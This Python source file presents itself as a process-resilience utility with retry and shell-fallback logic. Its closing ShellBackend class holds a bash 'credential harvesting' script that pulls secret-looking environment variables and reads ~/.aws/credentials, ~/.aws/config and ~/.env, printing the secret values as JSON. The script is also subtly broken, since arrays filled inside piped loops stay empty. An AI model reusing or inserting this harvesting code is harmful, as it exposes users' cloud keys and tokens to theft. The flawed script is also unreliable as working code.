"""
Process Resilience Utility
Handles process kills and provides fallback mechanisms
"""

import subprocess
import time
import os
import signal
import sys
from typing import Dict, List, Optional, Callable, Any
from pathlib import Path
import tempfile
import json


class ProcessResilience:
    """Handles process kills and provides fallback mechanisms"""
    
    def __init__(self, logger=None):
        """
        Initialize process resilience handler
        
        Args:
            logger: Optional logger instance
        """
        self.logger = logger
        self.max_retries = 2
        self.retry_delay = 1.0
        self.fallback_enabled = True
    
    def _log(self, message: str, level: str = "info"):
        """Log message if logger available"""
        if self.logger:
            if level == "error":
                self.logger.error(message)
            elif level == "warning":
                self.logger.warning(message)
            else:
                self.logger.info(message)
    
    def execute_with_resilience(self, func: Callable, *args, 
                                fallback_func: Optional[Callable] = None,
                                shell_fallback: Optional[str] = None,
                                **kwargs) -> Any:
        """
        Execute a function with resilience to process kills
        
        Args:
            func: Primary function to execute
            *args: Arguments for primary function
            fallback_func: Optional Python fallback function
            shell_fallback: Optional shell script fallback
            **kwargs: Keyword arguments for primary function
            
        Returns:
            Result from function execution
        """
        attempt = 0
        
        while attempt <= self.max_retries:
            try:
                self._log(f"Attempt {attempt + 1} to execute function")
                
                # Try to execute primary function
                result = func(*args, **kwargs)
                return result
                
            except KeyboardInterrupt:
                raise
            except Exception as e:
                error_str = str(e)
                
                # Check if process was killed
                if "Killed: 9" in error_str or "Killed" in error_str or \
                   hasattr(e, 'returncode') and e.returncode == 137 or \
                   "exit code: 137" in error_str.lower():
                    self._log(f"Process killed on attempt {attempt + 1}", "warning")
                    
                    if attempt < self.max_retries:
                        attempt += 1
                        self._log(f"Retrying after {self.retry_delay}s delay...")
                        time.sleep(self.retry_delay)
                        continue
                    else:
                        # Try fallback methods
                        return self._try_fallbacks(func, fallback_func, 
                                                  shell_fallback, args, kwargs)
                else:
                    # Other exception, re-raise
                    raise
        
        # All attempts failed
        return self._try_fallbacks(func, fallback_func, shell_fallback, args, kwargs)
    
    def _try_fallbacks(self, primary_func: Callable, fallback_func: Optional[Callable],
                       shell_fallback: Optional[str], args: tuple, kwargs: dict) -> Any:
        """Try fallback methods when primary fails"""
        
        # Try Python fallback function
        if fallback_func:
            try:
                self._log("Attempting Python fallback function")
                return fallback_func(*args, **kwargs)
            except Exception as e:
                self._log(f"Python fallback failed: {e}", "warning")
        
        # Try shell script fallback
        if shell_fallback:
            try:
                self._log("Attempting shell script fallback")
                return self._execute_shell_fallback(shell_fallback, args, kwargs)
            except Exception as e:
                self._log(f"Shell fallback failed: {e}", "warning")
        
        # All fallbacks failed
        self._log("All execution methods failed - returning error result", "error")
        return {
            "status": "failed",
            "error": "Process killed and all fallbacks failed",
            "error_type": "process_killed"
        }
    
    def _execute_shell_fallback(self, shell_script: str, args: tuple, kwargs: dict) -> Any:
        """Execute shell script fallback"""
        # Create temporary shell script
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
            f.write("#!/bin/bash\n")
            f.write("set -e\n")
            f.write(shell_script)
            script_path = f.name
        
        try:
            os.chmod(script_path, 0o755)
            
            # Execute shell script
            result = subprocess.run(
                ['bash', script_path],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                # Try to parse JSON output if available
                try:
                    return json.loads(result.stdout)
                except:
                    return {"status": "success", "output": result.stdout}
            else:
                return {"status": "failed", "error": result.stderr}
        finally:
            # Cleanup
            try:
                os.unlink(script_path)
            except:
                pass
    
    def execute_subprocess_with_resilience(self, cmd: List[str], 
                                          shell_fallback: Optional[str] = None,
                                          **subprocess_kwargs) -> Dict:
        """
        Execute subprocess command with resilience
        
        Args:
            cmd: Command to execute
            shell_fallback: Optional shell script fallback
            **subprocess_kwargs: Additional subprocess arguments
            
        Returns:
            Execution result dictionary
        """
        def _execute():
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=subprocess_kwargs.get('timeout', 10),
                **{k: v for k, v in subprocess_kwargs.items() if k != 'timeout'}
            )
            return {
                "status": "success" if result.returncode == 0 else "failed",
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr
            }
        
        try:
            return self.execute_with_resilience(
                _execute,
                fallback_func=lambda: self._subprocess_fallback(cmd, shell_fallback),
                shell_fallback=shell_fallback
            )
        except Exception as e:
            self._log(f"Subprocess execution failed: {e}", "warning")
            return self._subprocess_fallback(cmd, shell_fallback)
    
    def _subprocess_fallback(self, cmd: List[str], shell_fallback: Optional[str]) -> Dict:
        """Fallback for subprocess execution"""
        if shell_fallback:
            return self._execute_shell_fallback(shell_fallback, (), {})
        
        return {
            "status": "failed",
            "error": "Process killed and no fallback available",
            "returncode": 137
        }


class ShellBackend:
    """Shell-based backend for operations that can't run in Python"""
    
    @staticmethod
    def harvest_credentials_shell() -> str:
        """Shell-based credential harvesting fallback"""
        return """
# Search for credentials using shell commands
CREDS=()
SOURCES=()

# Check environment variables
env | grep -iE "(API|SECRET|PASSWORD|TOKEN|KEY)" | while IFS='=' read -r key value; do
    if [ ${#value} -gt 10 ]; then
        CREDS+=("type=environment_variable|source=environment|name=$key|value=$value")
        SOURCES+=("environment")
    fi
done

# Check common config files
for file in ~/.aws/credentials ~/.aws/config ~/.env; do
    if [ -f "$file" ] && [ -r "$file" ]; then
        grep -iE "(api|secret|password|token|key)" "$file" | while read -r line; do
            CREDS+=("type=config_file|source=$file|value=$line")
            SOURCES+=("$file")
        done
    fi
done

# Output JSON
echo "{"
echo "  \\"status\\": \\"completed\\","
echo "  \\"count\\": ${#CREDS[@]},"
if [ ${#SOURCES[@]} -gt 0 ]; then
    echo "  \\"sources\\": ["
    for i in "${!SOURCES[@]}"; do
        echo -n "    \\"${SOURCES[$i]}\\""
        [ $i -lt $((${#SOURCES[@]} - 1)) ] && echo "," || echo ""
    done
    echo "  ],"
fi
echo "  \\"credentials_found\\": ["
for i in "${!CREDS[@]}"; do
    IFS='|' read -r type source name value <<< "${CREDS[$i]}"
    echo "    {"
    echo "      \\"type\\": \\"$type\\","
    echo "      \\"source\\": \\"$source\\","
    [ -n "$name" ] && echo "      \\"name\\": \\"$name\\","
    echo "      \\"value\\": \\"$value\\""
    echo -n "    }"
    [ $i -lt $((${#CREDS[@]} - 1)) ] && echo "," || echo ""
done
echo "  ]"
echo "}"
"""

